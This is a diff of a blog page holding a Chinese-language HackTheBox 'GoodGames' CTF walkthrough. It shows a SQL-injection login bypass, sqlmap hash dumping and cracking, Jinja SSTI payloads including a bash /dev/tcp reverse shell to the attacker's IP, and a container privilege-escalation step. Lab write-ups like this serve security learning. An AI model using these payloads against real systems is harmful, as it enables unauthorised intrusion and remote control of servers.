@@ -7,8 +7,8 @@
 
 <head>
   <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
-  <link rel="icon" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
@@ -19,7 +19,7 @@
     <meta name="description" content="信息收集：因为网络环境的原因，用Nmap扫描全端口会很慢，所以我决定先用masscan确定目标端口开放情况，再使用Nmap对指定端口调用脚本进行扫描，或许会快很多： 1234567&gt;&gt; sudo masscan -p1-65535,U:1-65535 10.10.11.130 --rate 2000 -e tun0[sudo] mosaictheory 的密码：Starting mas">
 <meta property="og:type" content="article">
 <meta property="og:title" content="HackTheBox-GoodGames-Python SSTI">
-<meta property="og:url" content="http://example.com/2022/10/06/HackTheBox-GoodGames/index.html">
+<meta property="og:url" content="https://crazyinside.github.io/2022/10/06/HackTheBox-GoodGames/index.html">
 <meta property="og:site_name" content="Personal Cloud Note">
 <meta property="og:description" content="信息收集：因为网络环境的原因，用Nmap扫描全端口会很慢，所以我决定先用masscan确定目标端口开放情况，再使用Nmap对指定端口调用脚本进行扫描，或许会快很多： 1234567&gt;&gt; sudo masscan -p1-65535,U:1-65535 10.10.11.130 --rate 2000 -e tun0[sudo] mosaictheory 的密码：Starting mas">
 <meta property="og:locale" content="en_US">
@@ -35,7 +35,7 @@
 <meta property="og:image" content="https://www.worldisend.com/img/image-20220514164120410.png">
 <meta property="og:image" content="https://www.worldisend.com/img/image-20220514164613505.png">
 <meta property="og:image" content="https://www.worldisend.com/img/image-20220514172943695.png">
-<meta property="article:published_time" content="2022-10-06T11:30:34.889Z">
+<meta property="article:published_time" content="2022-10-06T13:49:08.220Z">
 <meta property="article:modified_time" content="2022-07-09T08:08:31.000Z">
 <meta property="article:author" content="Crazyinside">
 <meta property="article:tag" content="Linux">
@@ -82,7 +82,7 @@
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
     Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://www.worldisend.com/fluid/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+    var CONFIG = {"hostname":"crazyinside.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
 
     if (CONFIG.web_analytics.follow_dnt) {
       var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
@@ -203,7 +203,7 @@
   
 
 <div id="banner" class="banner" parallax=true
-     style="background: url('https://www.worldisend.com/fluid/img/default.png') no-repeat center center; background-size: cover;">
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
   <div class="full-bg-img">
     <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
       <div class="banner-text text-center fade-in-up">
@@ -220,7 +220,7 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-10-06 19:30" pubdate>
+        <time datetime="2022-10-06 21:49" pubdate>
           October 6, 2022 pm
         </time>
       </span>
@@ -300,24 +300,24 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 exploit(multi/http/werkzeug_debug_rce) &gt; show options <br><br>Module options (exploit/multi/http/werkzeug_debug_rce):<br><br>   Name       Current Setting  Required  Description<br>   ----       ---------------  --------  -----------<br>   Proxies                     no        A proxy chain of format <span class="hljs-built_in">type</span>:host:port[,<span class="hljs-built_in">type</span>:host:port][...]<br>   RHOSTS     10.10.11.130     <span class="hljs-built_in">yes</span>       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki<br>                                         /Using-Metasploit<br>   RPORT      80               <span class="hljs-built_in">yes</span>       The target port (TCP)<br>   SSL        <span class="hljs-literal">false</span>            no        Negotiate SSL/TLS <span class="hljs-keyword">for</span> outgoing connections<br>   TARGETURI  /console         <span class="hljs-built_in">yes</span>       URI to the console<br>   VHOST                       no        HTTP server virtual host<br><br><br>Payload options (python/meterpreter/reverse_tcp):<br><br>   Name   Current Setting  Required  Description<br>   ----   ---------------  --------  -----------<br>   LHOST  10.10.16.4       <span class="hljs-built_in">yes</span>       The listen address (an interface may be specified)<br>   LPORT  4444             <span class="hljs-built_in">yes</span>       The listen port<br></code></pre></td></tr></table></figure>
 
 <p>它需要一个URL进行代码执行，但是默认的/console是不行的，看来还是需要我去web页面看一眼，页面还挺棒：</p>
-<img src="https://www.worldisend.com/img/image-20220514153839603.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220514153839603" style="zoom:200%;" />
+<img src="https://www.worldisend.com/img/image-20220514153839603.png" srcset="/img/loading.gif" lazyload alt="image-20220514153839603" style="zoom:200%;" />
 
 <p>右上角有一个容易被人遗漏掉的人物图标，其实是一个登录按钮，而且是前端校验：</p>
-<img src="https://www.worldisend.com/img/image-20220514154319919.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220514154319919" style="zoom:200%;" />
+<img src="https://www.worldisend.com/img/image-20220514154319919.png" srcset="/img/loading.gif" lazyload alt="image-20220514154319919" style="zoom:200%;" />
 
 <p>万能密码就能登录，看来这套题的意义不在这里，登录成功后会进入用户配置页面，根据目前它为我显示的信息，我现在可能是管理员：</p>
-<img src="https://www.worldisend.com/img/image-20220514155537779.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220514155537779" style="zoom:200%;" />
+<img src="https://www.worldisend.com/img/image-20220514155537779.png" srcset="/img/loading.gif" lazyload alt="image-20220514155537779" style="zoom:200%;" />
 
 <p>整个页面只有一个更改密码的文本框，还要一些推特分享按钮，但是同样的在右上角一个会被人遗漏的地方，有一个齿轮图标：</p>
-<p><img src="https://www.worldisend.com/img/image-20220514155651322.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220514155651322"></p>
+<p><img src="https://www.worldisend.com/img/image-20220514155651322.png" srcset="/img/loading.gif" lazyload alt="image-20220514155651322"></p>
 <p>点击它会获得一个新域名：</p>
-<img src="https://www.worldisend.com/img/image-20220514155717462.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220514155717462" style="zoom:200%;" />
+<img src="https://www.worldisend.com/img/image-20220514155717462.png" srcset="/img/loading.gif" lazyload alt="image-20220514155717462" style="zoom:200%;" />
 
 <p>或许我可以试着将IP地址写入到hosts文件中再试试，它可以，而我获取到了一个新的登录页面：</p>
-<img src="https://www.worldisend.com/img/image-20220514155844929.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220514155844929" style="zoom:200%;" />
+<img src="https://www.worldisend.com/img/image-20220514155844929.png" srcset="/img/loading.gif" lazyload alt="image-20220514155844929" style="zoom:200%;" />
 
 <p>或许我的账号可以使用，但是我没有密码， 而万能密码在这里不起作用，或许在数据库中会有一些其他信息，而我刚刚只是简单的使用万能密码登录成功便没有了下文，或许我可以去查询一下数据库中会不会有什么信息：</p>
-<img src="https://www.worldisend.com/img/image-20220514160349717.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220514160349717" style="zoom:200%;" />
+<img src="https://www.worldisend.com/img/image-20220514160349717.png" srcset="/img/loading.gif" lazyload alt="image-20220514160349717" style="zoom:200%;" />
 
 <h4 id="SQL注入："><a href="#SQL注入：" class="headerlink" title="SQL注入："></a>SQL注入：</h4><p>可以把数据包保存下来通过SQLMAP去枚举，在数据库中有一串hash：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; sqlmap -r /home/mosaictheory/GoodGames/payload.txt -D main -T user -C password --dump<br>Database: main<br>Table: user<br>[1 entry]<br>+----------------------------------+<br>| password                         |<br>+----------------------------------+<br>| 2b22337f218b2d82dfc3b6f77e7cb8ec |<br>+----------------------------------+<br></code></pre></td></tr></table></figure>
@@ -326,18 +326,18 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; john <span class="hljs-built_in">hash</span> -w=/usr/share/wordlists/rockyou.txt                <br>Warning: detected <span class="hljs-built_in">hash</span> <span class="hljs-built_in">type</span> <span class="hljs-string">&quot;LM&quot;</span>, but the string is also recognized as <span class="hljs-string">&quot;dynamic=md5(<span class="hljs-variable">$p</span>)&quot;</span><br>Use the <span class="hljs-string">&quot;--format=dynamic=md5(<span class="hljs-variable">$p</span>)&quot;</span> option to force loading these as that <span class="hljs-built_in">type</span> instead<br>Warning: detected <span class="hljs-built_in">hash</span> <span class="hljs-built_in">type</span> <span class="hljs-string">&quot;LM&quot;</span>, but the string is also recognized as <span class="hljs-string">&quot;HAVAL-128-4&quot;</span><br>Use the <span class="hljs-string">&quot;--format=HAVAL-128-4&quot;</span> option to force loading these as that <span class="hljs-built_in">type</span> instead<br>Warning: detected <span class="hljs-built_in">hash</span> <span class="hljs-built_in">type</span> <span class="hljs-string">&quot;LM&quot;</span>, but the string is also recognized as <span class="hljs-string">&quot;MD2&quot;</span><br>Use the <span class="hljs-string">&quot;--format=MD2&quot;</span> option to force loading these as that <span class="hljs-built_in">type</span> instead<br>Warning: detected <span class="hljs-built_in">hash</span> <span class="hljs-built_in">type</span> <span class="hljs-string">&quot;LM&quot;</span>, but the string is also recognized as <span class="hljs-string">&quot;mdc2&quot;</span><br>Use the <span class="hljs-string">&quot;--format=mdc2&quot;</span> option to force loading these as that <span class="hljs-built_in">type</span> instead<br>Warning: detected <span class="hljs-built_in">hash</span> <span class="hljs-built_in">type</span> <span class="hljs-string">&quot;LM&quot;</span>, but the string is also recognized as <span class="hljs-string">&quot;mscash&quot;</span><br>Use the <span class="hljs-string">&quot;--format=mscash&quot;</span> option to force loading these as that <span class="hljs-built_in">type</span> instead<br>Warning: detected <span class="hljs-built_in">hash</span> <span class="hljs-built_in">type</span> <span class="hljs-string">&quot;LM&quot;</span>, but the string is also recognized as <span class="hljs-string">&quot;mscash2&quot;</span><br>Use the <span class="hljs-string">&quot;--format=mscash2&quot;</span> option to force loading these as that <span class="hljs-built_in">type</span> instead<br>Warning: detected <span class="hljs-built_in">hash</span> <span class="hljs-built_in">type</span> <span class="hljs-string">&quot;LM&quot;</span>, but the string is also recognized as <span class="hljs-string">&quot;NT&quot;</span><br>Use the <span class="hljs-string">&quot;--format=NT&quot;</span> option to force loading these as that <span class="hljs-built_in">type</span> instead<br>Warning: detected <span class="hljs-built_in">hash</span> <span class="hljs-built_in">type</span> <span class="hljs-string">&quot;LM&quot;</span>, but the string is also recognized as <span class="hljs-string">&quot;Raw-MD4&quot;</span><br>Use the <span class="hljs-string">&quot;--format=Raw-MD4&quot;</span> option to force loading these as that <span class="hljs-built_in">type</span> instead<br>Warning: detected <span class="hljs-built_in">hash</span> <span class="hljs-built_in">type</span> <span class="hljs-string">&quot;LM&quot;</span>, but the string is also recognized as <span class="hljs-string">&quot;Raw-MD5&quot;</span><br>Use the <span class="hljs-string">&quot;--format=Raw-MD5&quot;</span> option to force loading these as that <span class="hljs-built_in">type</span> instead<br>Warning: detected <span class="hljs-built_in">hash</span> <span class="hljs-built_in">type</span> <span class="hljs-string">&quot;LM&quot;</span>, but the string is also recognized as <span class="hljs-string">&quot;Raw-MD5u&quot;</span><br>Use the <span class="hljs-string">&quot;--format=Raw-MD5u&quot;</span> option to force loading these as that <span class="hljs-built_in">type</span> instead<br>Warning: detected <span class="hljs-built_in">hash</span> <span class="hljs-built_in">type</span> <span class="hljs-string">&quot;LM&quot;</span>, but the string is also recognized as <span class="hljs-string">&quot;Raw-SHA1-AxCrypt&quot;</span><br>Use the <span class="hljs-string">&quot;--format=Raw-SHA1-AxCrypt&quot;</span> option to force loading these as that <span class="hljs-built_in">type</span> instead<br>Warning: detected <span class="hljs-built_in">hash</span> <span class="hljs-built_in">type</span> <span class="hljs-string">&quot;LM&quot;</span>, but the string is also recognized as <span class="hljs-string">&quot;ripemd-128&quot;</span><br>Use the <span class="hljs-string">&quot;--format=ripemd-128&quot;</span> option to force loading these as that <span class="hljs-built_in">type</span> instead<br>Warning: detected <span class="hljs-built_in">hash</span> <span class="hljs-built_in">type</span> <span class="hljs-string">&quot;LM&quot;</span>, but the string is also recognized as <span class="hljs-string">&quot;Snefru-128&quot;</span><br>Use the <span class="hljs-string">&quot;--format=Snefru-128&quot;</span> option to force loading these as that <span class="hljs-built_in">type</span> instead<br>Warning: detected <span class="hljs-built_in">hash</span> <span class="hljs-built_in">type</span> <span class="hljs-string">&quot;LM&quot;</span>, but the string is also recognized as <span class="hljs-string">&quot;ZipMonster&quot;</span><br>Use the <span class="hljs-string">&quot;--format=ZipMonster&quot;</span> option to force loading these as that <span class="hljs-built_in">type</span> instead<br>Using default input encoding: UTF-8<br>Using default target encoding: CP850<br>Loaded 2 password hashes with no different salts (LM [DES 256/256 AVX2])<br>Warning: poor OpenMP scalability <span class="hljs-keyword">for</span> this <span class="hljs-built_in">hash</span> <span class="hljs-built_in">type</span>, consider --fork=4<br>Will run 4 OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>0g 0:00:00:01 DONE (2022-05-14 16:21) 0g/s 6619Kp/s 6619Kc/s 13238KC/s !!1QWER..*7¡VA<br>Session completed. <br></code></pre></td></tr></table></figure>
 
 <p>不过它似乎也不认识，但是谷歌帮我识别出来了，这还蛮意外的：</p>
-<img src="https://www.worldisend.com/img/image-20220514162303935.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220514162303935" style="zoom:200%;" />
+<img src="https://www.worldisend.com/img/image-20220514162303935.png" srcset="/img/loading.gif" lazyload alt="image-20220514162303935" style="zoom:200%;" />
 
 <p>我可以登录进去，并且在后台发现一个让我更改管理员名字的地方：</p>
-<img src="https://www.worldisend.com/img/image-20220514163039206.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220514163039206" style="zoom:200%;" />
+<img src="https://www.worldisend.com/img/image-20220514163039206.png" srcset="/img/loading.gif" lazyload alt="image-20220514163039206" style="zoom:200%;" />
 
 <h4 id="SSTI："><a href="#SSTI：" class="headerlink" title="SSTI："></a>SSTI：</h4><p>有可控参数，有回显，很明显的注入漏洞，XSS对我没什么意义，SQL注入我刚刚已经跑过了，那或许我能尝试一下SSTI，毕竟目标是个python环境：</p>
-<img src="https://www.worldisend.com/img/image-20220514164120410.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220514164120410" style="zoom:200%;" />
+<img src="https://www.worldisend.com/img/image-20220514164120410.png" srcset="/img/loading.gif" lazyload alt="image-20220514164120410" style="zoom:200%;" />
 
 <p>看起来可以，那么我可以试一下简单的payload：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;&#123; namespace.__init__.__globals__.os.popen(<span class="hljs-string">&#x27;id&#x27;</span>).<span class="hljs-built_in">read</span>() &#125;&#125;<br></code></pre></td></tr></table></figure>
 
-<img src="https://www.worldisend.com/img/image-20220514164613505.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220514164613505" style="zoom:200%;" />
+<img src="https://www.worldisend.com/img/image-20220514164613505.png" srcset="/img/loading.gif" lazyload alt="image-20220514164613505" style="zoom:200%;" />
 
 <p>它看起来还是root，我需要登录到目标会更方便一些，因为我还需要普通用户的flag，而我现在还不知道它是谁：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;&#123; namespace.__init__.__globals__.os.popen(<span class="hljs-string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.16.4/9001 0&gt;&amp;1&quot;&#x27;</span>).<span class="hljs-built_in">read</span>() &#125;&#125;<br></code></pre></td></tr></table></figure>
@@ -366,7 +366,7 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">augustus@GoodGames:~$ sudo -l<br>bash: sudo: <span class="hljs-built_in">command</span> not found<br></code></pre></td></tr></table></figure>
 
 <p>容器与当前目录是一样的，并且他们是互通的：</p>
-<p><img src="https://www.worldisend.com/img/image-20220514172943695.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220514172943695"></p>
+<p><img src="https://www.worldisend.com/img/image-20220514172943695.png" srcset="/img/loading.gif" lazyload alt="image-20220514172943695"></p>
 <p>我可以尝试CP一个root权限的bash到当前目录下:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">augustus@GoodGames:~$ <span class="hljs-built_in">cp</span> /bin/bash .<br></code></pre></td></tr></table></figure>
 
@@ -424,7 +424,7 @@
   <div class="license-box my-3">
     <div class="license-title">
       <div>HackTheBox-GoodGames-Python SSTI</div>
-      <div>http://example.com/2022/10/06/HackTheBox-GoodGames/</div>
+      <div>https://crazyinside.github.io/2022/10/06/HackTheBox-GoodGames/</div>
     </div>
     <div class="license-meta">
       
@@ -468,9 +468,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/10/06/HackTheBox-Gobox/" title="HackTheBox-Gobox">
+                      <a href="/2022/10/06/HackTheBox-Cap/" title="HackTheBox-Cap">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">HackTheBox-Gobox</span>
+                        <span class="hidden-mobile">HackTheBox-Cap</span>
                         <span class="visible-mobile">Previous</span>
                       </a>
                     
@@ -478,8 +478,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/10/06/HackTheBox-NodeBlog/" title="HackTheBox-NodeBlog">
-                        <span class="hidden-mobile">HackTheBox-NodeBlog</span>
+                      <a href="/2022/10/06/HackTheBox-SwagShop-MagentoeCommerce-RemoteCodeExecution/" title="HackTheBox-SwagShop">
+                        <span class="hidden-mobile">HackTheBox-SwagShop</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
